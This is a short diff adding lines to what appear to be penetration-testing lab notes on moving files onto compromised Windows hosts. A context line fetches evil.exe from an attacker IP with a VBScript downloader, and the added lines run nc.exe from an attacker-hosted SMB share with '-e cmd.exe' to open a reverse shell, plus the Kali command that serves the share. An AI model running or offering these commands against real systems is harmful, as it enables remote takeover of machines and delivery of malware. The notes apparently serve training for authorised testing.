@@ -115,6 +115,13 @@ echo ts.Close >> wget.vbs
 
 C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
 
+#File Transfer via SMB
+
+On windows:
+cmd.exe /c //192.168.49.67/Share/nc.exe -e cmd.exe 192.168.49.67 8082
+
+On Kali:
+python2 smbserver.py -smb2support Share /home/kali/
 
 #FTP (pyftpdlib client on Kali)
 # Ftp is generally installed on Windows machines
